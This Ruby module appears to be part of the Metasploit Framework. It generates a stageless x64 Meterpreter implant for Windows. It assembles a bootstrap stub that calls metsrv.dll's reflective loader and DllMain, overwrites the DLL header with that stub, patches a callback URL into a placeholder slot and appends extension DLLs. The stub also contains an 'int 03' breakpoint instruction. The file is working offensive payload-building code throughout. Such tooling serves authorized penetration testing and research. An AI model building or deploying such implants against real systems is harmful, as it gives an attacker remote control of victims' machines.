#-*- coding: binary -*-

require 'msf/core'

module Msf

##
#
# Implements stageless invocation of metsrv in x64
#
##

module Payload::Windows::StagelessMeterpreter_x64

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::ReflectiveDLLLoader

  def asm_invoke_metsrv(opts={})
    asm = %Q^
        ; prologue
          pop r10               ; 'MZ'
          int 03
          push r10              ; back to where we started
          push rbp              ; save rbp
          mov rbp, rsp          ; set up a new stack frame
          sub rsp, 32           ; allocate some space for calls.
        ; GetPC
          call $+9              ; relative call to get location
          pop rbx               ; pop return value
          ;lea rbx, [rel+0]      ; get the VA for the start of this stub
        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader()
          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 10)}
          call rbx              ; invoke ReflectiveLoader()
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
          ; offset from ReflectiveLoader() to the end of the DLL
          add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
          mov r8, rbx           ; r8 points to the extension list
          mov rbx, rax          ; save DllMain for another call
          push 4                ; push up 4, indicate that we have attached
          pop rdx               ; pop 4 into rdx
          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
          ; push the exitfunk value onto the stack
          mov r8d, #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
          push 5                ; push 5, indicate that we have detached
          pop rdx               ; pop 5 into rdx
          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
    ^

    asm
  end

  def generate_stageless_meterpreter(url = nil)
    dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x64.dll'))

    conf = {
      :rdi_offset => offset,
      :length     => dll.length,
      :exitfunk   => datastore['EXITFUNC']
    }

    asm = asm_invoke_metsrv(conf)

    # generate the bootstrap asm
    bootstrap = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if bootstrap.length > 62
      print_error("Stageless Meterpreter generated with oversized x64 bootstrap.")
      return
    end

    # patch the binary with all the stuff
    dll[0, bootstrap.length] = bootstrap

    # the URL might not be given, as it might be patched in some other way
    if url
      url = "s#{url}\x00"
      location = dll.index("https://#{'X' * 256}")
      if location
        dll[location, url.length] = url
      end
    end

    # if a block is given then call that with the meterpreter dll
    # so that custom patching can happen if required
    yield dll if block_given?

    # append each extension to the payload, including
    # the size of the extension
    unless datastore['EXTENSIONS'].nil?
      datastore['EXTENSIONS'].split(',').each do |e|
        e = e.strip.downcase
        ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{e}", 'x64.dll'))

        # append the size, offset to RDI and the payload itself
        dll << [ext.length].pack('V') + ext
      end
    end

    # Terminate the "list" of extensions
    dll + [0].pack('V')
  end

end

end

